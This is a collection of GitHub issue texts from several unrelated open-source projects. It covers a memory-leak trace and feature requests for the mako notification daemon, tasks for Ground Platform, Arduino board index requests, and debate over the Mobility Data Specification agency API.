    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59134a in create_criteria_from_notification ../criteria.c:369
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57eb30 in notification_execute_binding ../notification.c:304
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 199 byte(s) in 199 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59111e in create_criteria_from_notification ../criteria.c:367
    #2 0x55876c579ebf in handle_notify ../dbus/xdg.c:370
    #3 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 199 byte(s) in 199 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c565522 in apply_style ../config.c:163
    #2 0x55876c59093a in apply_each_criteria ../criteria.c:335
    #3 0x55876c579911 in handle_notify ../dbus/xdg.c:334
    #4 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 158 byte(s) in 158 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59111e in create_criteria_from_notification ../criteria.c:367
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57cf54 in close_all_notifications ../notification.c:127
    #4 0x55876c574807 in handle_dismiss_all_notifications ../dbus/mako.c:21
    #5 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 102 byte(s) in 8 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590ce2 in create_criteria_from_notification ../criteria.c:363
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57eb30 in notification_execute_binding ../notification.c:304
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 99 byte(s) in 5 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590ce2 in create_criteria_from_notification ../criteria.c:363
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c574964 in handle_dismiss_last_notification ../dbus/mako.c:37
    #4 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 90 byte(s) in 5 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59134a in create_criteria_from_notification ../criteria.c:369
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c574964 in handle_dismiss_last_notification ../dbus/mako.c:37
    #4 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 70 byte(s) in 28 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591234 in create_criteria_from_notification ../criteria.c:368
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57e824 in notification_execute_binding ../notification.c:291
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 64 byte(s) in 8 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590bcc in create_criteria_from_notification ../criteria.c:362
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57eb30 in notification_execute_binding ../notification.c:304
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 50 byte(s) in 8 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591234 in create_criteria_from_notification ../criteria.c:368
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57eb30 in notification_execute_binding ../notification.c:304
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 41 byte(s) in 41 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c565522 in apply_style ../config.c:163
    #2 0x55876c585165 in render ../render.c:317
    #3 0x55876c58b6ba in send_frame ../wayland.c:451
    #4 0x55876c58cef1 in frame_handle_done ../wayland.c:563
    #5 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 40 byte(s) in 5 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590bcc in create_criteria_from_notification ../criteria.c:362
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c574964 in handle_dismiss_last_notification ../dbus/mako.c:37
    #4 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 28 byte(s) in 28 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59111e in create_criteria_from_notification ../criteria.c:367
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57e824 in notification_execute_binding ../notification.c:291
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 26 byte(s) in 5 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591234 in create_criteria_from_notification ../criteria.c:368
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c574964 in handle_dismiss_last_notification ../dbus/mako.c:37
    #4 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 25 byte(s) in 25 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c565522 in apply_style ../config.c:163
    #2 0x55876c585165 in render ../render.c:317
    #3 0x55876c58b6ba in send_frame ../wayland.c:451
    #4 0x55876c58840e in layer_surface_handle_configure ../wayland.c:256
    #5 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 8 byte(s) in 8 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59111e in create_criteria_from_notification ../criteria.c:367
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57eb30 in notification_execute_binding ../notification.c:304
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 5 byte(s) in 5 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59111e in create_criteria_from_notification ../criteria.c:367
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c574964 in handle_dismiss_last_notification ../dbus/mako.c:37
    #4 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 1 byte(s) in 1 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c5647d3 in init_default_style ../config.c:104
    #2 0x55876c562dc2 in init_default_config ../config.c:24
    #3 0x55876c5705d1 in reload_config ../config.c:703
    #4 0x55876c57b0ac in main ../main.c:90
    #5 0x7f51302a3152 in __libc_start_main (/usr/lib/libc.so.6+0x27152)

Direct leak of 1 byte(s) in 1 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c5647d3 in init_default_style ../config.c:104
    #2 0x55876c562dc2 in init_default_config ../config.c:24
    #3 0x55876c57b08d in main ../main.c:89
    #4 0x7f51302a3152 in __libc_start_main (/usr/lib/libc.so.6+0x27152)

Indirect leak of 376800 byte(s) in 11775 object(s) allocated from:
    #0 0x7f51312a9cd8 in __interceptor_calloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:153
    #1 0x7f512fe36c09  (/usr/lib/libfontconfig.so.1+0x21c09)

Indirect leak of 110135 byte(s) in 7415 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x7f512fe35e45 in FcValueSave (/usr/lib/libfontconfig.so.1+0x20e45)

Indirect leak of 64160 byte(s) in 2005 object(s) allocated from:
    #0 0x7f51312a9cd8 in __interceptor_calloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:153
    #1 0x7f512fe360d9  (/usr/lib/libfontconfig.so.1+0x210d9)

Indirect leak of 33440 byte(s) in 1045 object(s) allocated from:
    #0 0x7f51312a9aca in __interceptor_malloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:144
    #1 0x7f512fe22780  (/usr/lib/libfontconfig.so.1+0xd780)

Indirect leak of 23856 byte(s) in 497 object(s) allocated from:
    #0 0x7f51312a9aca in __interceptor_malloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:144
    #1 0x7f512fe3003e in FcLangSetCreate (/usr/lib/libfontconfig.so.1+0x1b03e)

Indirect leak of 15936 byte(s) in 498 object(s) allocated from:
    #0 0x7f51312a9cd8 in __interceptor_calloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:153
    #1 0x7f512fe35f77  (/usr/lib/libfontconfig.so.1+0x20f77)

Indirect leak of 8704 byte(s) in 272 object(s) allocated from:
    #0 0x7f51312a9cd8 in __interceptor_calloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:153
    #1 0x7f512fe35fe7  (/usr/lib/libfontconfig.so.1+0x20fe7)

Indirect leak of 32 byte(s) in 1 object(s) allocated from:
    #0 0x7f51312a9aca in __interceptor_malloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:144
    #1 0x7f512fe2240f  (/usr/lib/libfontconfig.so.1+0xd40f)

SUMMARY: AddressSanitizer: 964500 byte(s) leaked in 26672 allocation(s).
``` I use

```
notify-send -t 5000 --icon=/usr/share/icons/gnome/32x32/actions/mail-message-new.png ...
```

but mako doesn't display the icon:

```
Failed to load icon (Failed to open file “/usr/share/icons/gnome/32x32/actions/mail-message-new.png”: Permission denied)
```

dmesg contains:

```
audit: type=1400 audit(1576251187.001:673): apparmor="DENIED" operation="open" profile="fr.emersion.Mako" name="/usr/share/icons/gnome/32x32/actions/mail-message-new.png" pid=9537 comm="mako" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
```

```
15:24 < emersion> this needs to be fixed here: https://github.com/emersion/mako/blob/master/contrib/apparmor/fr.emersion.Mako
15:24 < emersion> patches welcome
15:26 < emersion> tbm: including <abstractions/freedesktop.org> might be enough
15:26 < emersion> https://raw.githubusercontent.com/mk-fg/apparmor-profiles/master/profiles/abstractions/freedesktop.org
```

I'll try that later. I would like important notifications to be displayed with layer=overlay and other notifications with layer=top. I would like to request an option to use a custom icon something like this:

```
[summary=OMG]
background-color=#C40023
icon=/path/to/OMG.png
```

 The human eye/brain is trained to react to movement in the corner of the eye. So I‘d like to suggest that the notifications (can be configured to) move quickly (e.g. from the next border) into their position, when they are created. This makes notifications much more noticeable and looks cool.

Would you consider this a nice feature to have in mako? Do you think it would be possible to implement with a reasonable amount off effort? im confused, how to  make use of this program?? how to send a notification from by terminal ? I get:

```
Failed to load icon (Failed to open file “/tmp/.org.chromium.Chromium.lcrCoS”: Permission denied)
```
```
[1364767.380428] audit: type=1400 audit(1576751213.101:785): apparmor="DENIED" operation="open" profile="fr.emersion.Mako" name="/tmp/.org.chromium.Chromium.lcrCoS" pid=1242 comm="mako" requested_mask="r" denied_mask="r" fsuid=1000 ouid=1000
```
 im confused, how to  make use of this program?? how to send a notification from by terminal ? I tried several ways to get livereload work to make customizing mako easier.

Any way to quickly get response after editing the mako settings? I wanted to set up some criteria, as I had with dunst, and I would like to see what the criteria of the notifications are so I can match them more easily.

dunst has a `-print` flag that will output useful information about a notification to write proper rules. As far as I can tell, mako has no such option (yet).

Src[1]: https://wiki.archlinux.org/index.php/Dunst#Filtering
Src[2]: https://github.com/dunst-project/dunst/blob/master/dunstrc#L337-L338 Hi,

recently I have started using `mako` instead of `dunst` and I noticed a difference in behaviour that I believe to be a bug.

If I call `notify-send.sh --print-id --replace 100 App Body`, the returned id is not 100 unless the notification with id 100 already exists. However, according to [the spec](http://www.galago-project.org/specs/notification/0.9/x408.html):

> If replaces_id is not 0, the returned value is the same value as replaces_id. 

the returned id should be the same as `--replace` id (no mention on whether or not the notification exists). Dunst does return the same id even for non-existent notifications.

I believe this was briefly touched on in #114 ([here exactly](https://github.com/emersion/mako/pull/114#discussion_r257463621)) but the current solution just creates a new notification with brand new id. Hi,

recently I have started using `mako` instead of `dunst` and I noticed a difference in behaviour that I believe to be a bug.

If I call `notify-send.sh --print-id --replace 100 App Body`, the returned id is not 100 unless the notification with id 100 already exists. However, according to [the spec](http://www.galago-project.org/specs/notification/0.9/x408.html):

> If replaces_id is not 0, the returned value is the same value as replaces_id. 

the returned id should be the same as `--replace` id (no mention on whether or not the notification exists). Dunst does return the same id even for non-existent notifications.

I believe this was briefly touched on in #114 ([here exactly](https://github.com/emersion/mako/pull/114#discussion_r257463621)) but the current solution just creates a new notification with brand new id. Possibly dupe of #180, depending on what the issue is.

Output of `dbus-monitor path=/org/freedesktop/Notifications`:

```
signal time=1568039420.502729 sender=org.freedesktop.DBus -> destination=:1.3918 serial=2 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=NameAcquired
   string ":1.3918"
signal time=1568039420.502883 sender=org.freedesktop.DBus -> destination=:1.3918 serial=4 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=NameLost
   string ":1.3918"
method call time=1568039421.534782 sender=:1.3678 -> destination=org.freedesktop.Notifications serial=1704 path=/org/freedesktop/Notifications; interface=org.freedesktop.Notifications; member=Notify
   string "strawberry"
   uint32 0
   string ""
   string "Forsaken City (8-Bit) by Kevin Regamey"
   string "on <b>Celeste - Madeline's Grab Bag</b> (2018)
Length: 2:13 | Play count: 0
<small>01 - Forsaken City (8-Bit).flac</small>"
   array [
   ]
   array [
      dict entry(
         string "image_data"
         variant             struct {
               int32 100
               int32 100
               int32 400
               boolean true
               int32 8
               int32 4
               array of bytes [
                  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
```
(A long time later...)
```
                  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
               ]
            }
      )
      dict entry(
         string "transient"
         variant             boolean true
      )
   ]
   int32 5000
```

Full output can be seen [here](http://ix.io/1UFy). Hi, I'm running Gentoo with OpenRC. I would like to install mako without systemd. Would it be possible to do this or to make a change that will allow this? Hi!

Starting playing with Mako I'm not sure if I'm geeting all of the wording beind the `max-visible` things:

> If -1, all notifications are visible

When I set this to `-X` and then execute something like `notify-send "foo"` mako display the notification and an extra "(X+1 more)" as shown in the following screenshot:

![Untitled](https://user-images.githubusercontent.com/13803031/55290331-73e9b380-53c1-11e9-9efe-ddb124ee21cd.png)

Not sur if its unwanted or I didn't get the meaning of this option.

Thanks for the contribution with Mako! When using Mako to test a tool I've been working on in Wayland, I noticed it's displaying hyperlinks as plain text markup. I noticed some older issues and PRs referencing other basic markup which wasn't supported in 1.2 so I switched to `mako-git` in the AUR (05a3e4b) and the issue is still present.

### Expected
* Mako either displays a clickable link, **OR**
* Mako filters out the markup and only displays the link text

### Actual
The raw markup is displayed in its entirety, regardless of whether `--markup` is `1` or `0`:
![Screenshot of broken notification containing hyperlinks in Mako](https://user-images.githubusercontent.com/1521802/52907654-810d7180-325d-11e9-9f90-19d948b8c7c7.png)

Compare this to how `notify-osd` handles it on my X11/i3 host environment:
![Screenshot of correctly filtered markup in notify-osd notifications](https://user-images.githubusercontent.com/1521802/52907734-676d2980-325f-11e9-95d3-c7dab15474a1.png) The human eye/brain is trained to react to movement in the corner of the eye. So I‘d like to suggest that the notifications (can be configured to) move quickly (e.g. from the next border) into their position, when they are created. This makes notifications much more noticeable and looks cool.

Would you consider this a nice feature to have in mako? Do you think it would be possible to implement with a reasonable amount off effort? Great project!

I tried to have a summary with bigger font as in `<big>%s</big>` or `<span size='larger'>%s</span>` without luck.
The only way I could achieve this was setting the size as in: `<span size='16000'>%s</span>`.

Maybe a bug?
<---------->
131027760
Some additional polish for the demo We recently acquired and configured vanity URL groundplatform.org. When setting the custom domain in GitHub Pages Settings, assets are not found because URLs include /ground-platform prefix, which doesn't work from custom domain. I believe to fix this we need to specify a base url in _config.yml and to update the page sources as per:
https://github.com/jekyll/jekyll/issues/332#issuecomment-18952908 Example:
https://us-central1-gnddemo1.cloudfunctions.net/exportCsv?project=frogs&featureType=frog&lang=en   Issue for tagging comments that should be moved into Wiki 1. "Customize" from layer overflow menu
2. Click any field to expand
3. Click any object in the field (type, option, etc.), field collapses  Issue/PR templates can help make Issues/PRs more readable by standardizing the way contributors report problems and describe solutions.

Open source projects such as golang have them: https://github.com/golang/go/tree/master/.github

I have used a simplified issue template to more or less talk to myself in personal projects: https://github.com/dhvogel/cryptorides-karl/blob/master/.github/ISSUE_TEMPLATE.md

here are some other templates we can chose from: https://github.com/stevemao/github-issue-templates  We should use a logging library to do things like:
- split log messages into classes such as info/warn/fatal
- append metadata to log statements i.e. timestamp
- pipe logs to places other than stdout should we so chose

I have limited experience with winston (https://www.npmjs.com/package/winston), open to other options. Only record creator and project managers should be allowed to delete records. 

@hintzemichael should this be added to the overflow menu on records in the side panel? This issue tracks progress toward removing linting debt. Likely candidate for modeling immutable collections:
https://immutable-js.github.io/immutable-js/

This involves several steps:
- [ ] `npm install --save immutable`
- [ ] Define `StringDictionary` as `Immutable.Map<string, string>` and rename to `StringMap`.
    https://github.com/google/ground-platform/blob/816483fccaed8aae2b8d48d3f2c99f994d250473/web-ng/src/app/shared/models/string-dictionary.model.ts#L20-L22
- [ ] Create new `Project` from  `DocumentSnapshot` instead of casting:
    https://github.com/google/ground-platform/blob/7e478c250a50e7a29d6bd6ab498f3a9d334ca5dc/web-ng/src/app/services/data-store/data-store.service.ts#L37
- [ ] Extra credit: create `Layer` object with `name: StringMap` and to `Project` as `layers: Map<string, Layer>`, building map at load time as above. Shown when no feature is selected. For now a flat list will do, in the future we'll want to also show the styled marker icon, visibility toggle, and overflow menu. @jacobmclaws is currently creating mocks for the side panel, but functionality/flow will more or less remain the same. Likely candidate for modeling immutable collections:
https://immutable-js.github.io/immutable-js/

This involves several steps:
- [x] `npm install --save immutable`
- [x] Define `StringDictionary` as `Immutable.Map<string, string>` and rename to `StringMap`.
    https://github.com/google/ground-platform/blob/816483fccaed8aae2b8d48d3f2c99f994d250473/web-ng/src/app/shared/models/string-dictionary.model.ts#L20-L22
- [x] Create new `Project` from  `DocumentSnapshot` instead of casting:
    https://github.com/google/ground-platform/blob/7e478c250a50e7a29d6bd6ab498f3a9d334ca5dc/web-ng/src/app/services/data-store/data-store.service.ts#L37
- [x] Extra credit: create `Layer` object with `name: StringMap` and to `Project` as `layers: Map<string, Layer>`, building map at load time as above. Related: #38 #58 

We should choose some continuous integration tool to run tests/checks/deployments/etc.

Travis CI (hosted, free for open source projects) is an option: travis-ci.org

 When I open feature panel, I cannot scroll down/up.  In the process, PropTypes can be replaced with Flow types for consistency:
https://stackoverflow.com/questions/36065185/react-proptypes-vs-flow
<---------->
131759043
Please @wero1414 

add new version with:

- Bast USB Serial
- Travis CatWAN Relay

Thanks Please @wero1414 

add new version with:

- Bast USB Serial
- Travis CatWAN Relay

Thanks I was looking at the samd_advanced architecture name and I understand why the name SAMDLC. 

You should change to lowercase 'samdlc' and change the library to the same name.

https://github.com/ElectronicCats/Arduino_Boards_Index/blob/011e044fcaac7bed9a43d79accc06ef3f1ce5939/package_electroniccats_index.json#L77

https://github.com/ElectronicCats/Arduino_Boards_Index/blob/011e044fcaac7bed9a43d79accc06ef3f1ce5939/electroniccats/samd_advanced/libraries/SPI/library.properties#L9

Maybe is a good idea to make a unique architecture to the BastWAN (samr34).

https://github.com/ElectronicCats/Arduino_Boards_Index/blob/011e044fcaac7bed9a43d79accc06ef3f1ce5939/electroniccats/samd_advanced/boards.txt#L183

Don't forget to change the BastWAN board 👍  I was looking at the samd_advanced architecture name and I understand why the name SAMDLC. 

You should change to lowercase 'samdlc' and change the library to the same name.

https://github.com/ElectronicCats/Arduino_Boards_Index/blob/011e044fcaac7bed9a43d79accc06ef3f1ce5939/package_electroniccats_index.json#L77

https://github.com/ElectronicCats/Arduino_Boards_Index/blob/011e044fcaac7bed9a43d79accc06ef3f1ce5939/electroniccats/samd_advanced/libraries/SPI/library.properties#L9

Maybe is a good idea to make a unique architecture to the BastWAN (samr34).

https://github.com/ElectronicCats/Arduino_Boards_Index/blob/011e044fcaac7bed9a43d79accc06ef3f1ce5939/electroniccats/samd_advanced/boards.txt#L183

Don't forget to change the BastWAN board 👍 
<---------->
132033870
placeholder.  Seattle DOT requires vendors to provide an administrative unlock functionality to allow city staff to unlock and move an improperly parked bike if needed. It would be helpful to include the following associated event_type_reason codes for tracking any use of the administrative unlock: “admin_pick_up” and “admin_drop_off_unavail” to the event_type “unavailable” and “admin_drop_off_avail” to the event_type “available.”  i initially had some confusion about how providers should go about paginating their APIs and how clients should consume from the MDS paginated apis. this was all written out here and clarified by @thekaveman https://github.com/CityofSantaMonica/mds-provider/pull/57

so if clients shouldn't have to understand the query parameter schema in the `next` url of the `links` body, then the provider APIs should be able to use a stateless pagination token in the query parameter so they know when to send a response with an empty `next` url

this pagination token would be created upon the first request the client makes, and added onto the query parameters of the `next` url in the response (ie. `?start_time=100&end_time=199&page_token=...`. this will make it so that every subsequent request made by the client using the `next` url will have the information for what time window the client requested, so that the server can know when to return `next` url as `null`.

so since provider APIs are meant to implement pagination however they want, if they were to use query parameters in this manner, **is there a way that we can reserve and document query parameter keywords for pagination?** i would want to avoid the case where some provider API uses the query parameter `page_token` and then in the future, for whatever reason, we require the parameter `page_token` to be used for some other purpose.

@thekaveman @hunterowens thoughts? Currently, agency requires that provides report telemetry every 5 minutes. Given the nature of these devices, that may not be truthful data when it is reported. We might want to have a different reporting requirement. @whereissean  A few GEOJSON objects are used in the agency API:
- Point in update_vehicle_status and start/end_trip
- MultiPolygon in service_areas

Wouldn't it be more flexible to take advantage of GEOJSON features to enable attaching properties to the GEOJSON object ?
- Point could be replaced by a Feature.
- MultiPolygon could be replaced by a Feature Collection.

This would enable, for instance, attaching a pricing rate as a property to the geometry of a service_area. Or attach the accuracy to the location.

What do you think ? In the current spec, `trip_id` is generated by the agency in response to a `start_trip` call. I think this creates an undesirable dependency on the agency’s infrastructure. 

If I’m reading correctly, the `trip_id` is also used in `end_trip` and `trips` APIs. Now, imagine that the agency’s API server goes down for whatever reason (bugs, power outage, network outage, server maintenance, etc.). The provider will attempt to call `start_trip` and get a failure. Now they don’t have a trip ID with which to identify the trip, so they are in a pickle. If they go ahead and start the trip, it will never have an agency-approved trip ID. If they don’t start the trip, their service is effectively shut down. 

I would suggest moving `trip_id` to be an argument to `start_trip` rather than a return value. This would eliminate the dependency. 

Thanks for all the good work! Per @HenriJ

`Could we add a timestamp field the event so that if we receive it later, we can know the real time when it occurred ? After evaluating LADOT’s application, we have the following outstanding questions:

* What are the City's expectations for the maintenance schedule and logs? How often is it expected that we update this information? What is the report-maintenance API? Is this the Agency API?
* Can you publicly provide a detailed methodology for how you plan on evaluating caps?
* What should we be preparing for in terms of an implementation of the Agency-side API? What is the timeframe?
* Requirement to comply with MDS-agency within 30 days of final is onerous for any company. This conflicts directly with MDS’ documentation which specifies ongoing support for previous minor release in this case `0.2.1`. We propose a 90-day grace period after the specification is released. Would LADOT be amenable to that?
* How will the city be evaluating compliance within the parking standard?
* How do we best certify compliance with `0.3.0` when it has not yet been released? How long do we have to come into compliance after it is released?
* How can we get access to the city's program portal to update our organizational chart and contact information? It would be best for simplicity and "auditability" purposes to not be able to reuse a unique_id even if deregistered. If so, maybe it should be mentioned in the specification ?
The difference between the error codes 305 (already registered) and 311 (duplicate registration) is also not completely clear ?
 Some sensible transitions are missing from `event_types`.

A vehicle can be put back in the street at the end of a trip, a maintenance or a rebalancing, but be unavailable for the time being. I propose to add `trip_end_available` and `provider_drop_off_unavailable` event types (this may not be the best naming for these transitions, do not hesitate to provide alternatives)

This is especially true for electrically powered devices, as it makes sense for the vehicles to be `unavailable` by default, until the battery status is checked and the provider makes sure the vehicle can be made available again. For now, BlueLA  has to send successive events on the agency API to express this, which is not ideal.

I'll attach a PR to this issue, unfortunately I have no access to the source file for the state machine diagram and was unable to provide a new diagram along. Including the source of the diagram may be of use for other contributors ?

What do you think ? Thanks in advance for your comments. Hello,

Following discussions with @karcass on using the sandbox API, we agreed the status changes should be ordered chronologically.

They are most likely seen as a time series, but as it is not precisely specified, providers could very well paginate the results in any order they see fit. The API would be easier to use if a stable order is specified.

I'll attach a PR with a proposition for a basic `event_time` increasing order, but we could introduce a full order on the (`event_time`, `device_id`) pair: this will be required anyway for proper pagination on the provider side, and if https://github.com/CityOfLosAngeles/mobility-data-specification/issues/272 get through, this pair in particular would make sense.

What do you think ? Thanks for your comments. Hello, 

The Provider and Agency APIs list different `event_type` and `event_type_reason` values.
This is cumbersome (and error-prone) on the provider side and the agency side alike. We could maintain a single list of `event_type` and share it between the two APIs ? I could submit a PR if you are interested.

AFAICT the agency side has a more elaborate list of events, so it makes sense to use this list as a first version. However this would be a breaking change for the Provider API. Another approach would be to begin with a non breaking list including all events from the Provider and Agency APIs, then indicate some values to be deprecated in the next major version.

What do you think ? On a single device, different vehicle events (agency side) and status changes (provider side) should have different timestamps.

In the specification as it is, nothing prevents a provider to present multiple status changes on a single timestamp value for the same device. I guess this is not expected, as it makes the resulting vehicle status undecidable for the agency. In the current specification the api mandates that the following fields are UUID4 (as per https://github.com/CityOfLosAngeles/mobility-data-specification/tree/1b0fb7ba707d85d0cfbc8cb5d4bd2ae90fd351e1/agency )

| Field | Type | Required/Optional | Comments |
|---|---|---|---|
| device_id | UUID4 | Required | ID used in Register |
| trip_id |	UUID4 |	Required	| UUID provided by Operator to uniquely identify the trip. |

This breaks backward compatibility though, the provider api didn't require these fields to be UUID4, and it needed it just to be an UUID as per: https://github.com/CityOfLosAngeles/mobility-data-specification/tree/1b0fb7ba707d85d0cfbc8cb5d4bd2ae90fd351e1/provider

| Field | Type | Required/Optional | Comments |
|---|---|---|---|
| device_id | UUID | Required | A unique device ID in UUID format |
| trip_id |	UUID |	Required	| A unique ID for each trip |

In our system lot of the above fields are in uuid v1 which would fail to validate as UUID4 (because the version number 4 is not present in the uuid), this stops us from ingesting those device_id using the agency api. The agency api throws `not a valid UUID4`, would you please consider removing the validation of UUID4 and let it be just an UUID to match the provider api.
 Context: I am working on an implementation of MDS for BlueLA, a station-based electric car sharing service in Los Angeles. The suggestion below would apply there and also for any service where devices can autonomously recharge their battery on docks (charge points).

When a customer returns a device to a dock, the battery of the device may be too low for the device to be available for another customer. The service then yields an `unavailable` event type with the `low_battery` reason. That part is fine. Then the device charges itself at the dock (without needing any human interaction). When it's done, the device becomes available again. I think that the `maintenance_drop_off` event type reason is not appropriate here, because there is no (human) maintenance per se. I hence suggest a new `battery_ok` event type reason for the `available` event type.

If this sounds reasonable, I'll happily write a pull request.

This is related to #77, albeit different. An implementation of Agency should be able to ingest all necessary data to fully implement Provider.  Agency currently has _most_ of that information, but it does not receive `standard_cost`, `actual_cost`, or `trip_distance`.  Distance could be derived from the GPS trace, but the other two cannot. 

I was thinking that we could add the cost fields as required for the `trip_end` event.

Interested to hear what folks think. On the Agency API, many fields are _required_ for telemetry but depending on the onboard device and third party software, the information may not be available:
- altitude
- heading
- speed
- HDOP
- number of satellites

Could they be optional instead ?
PR attached : https://github.com/CityOfLosAngeles/mobility-data-specification/pull/245 I believe this should not be the case because:

- Events order is hard to guarantee for the provider
- Agency API should not be blocking for providers
- No specific finite-state machine should be imposed

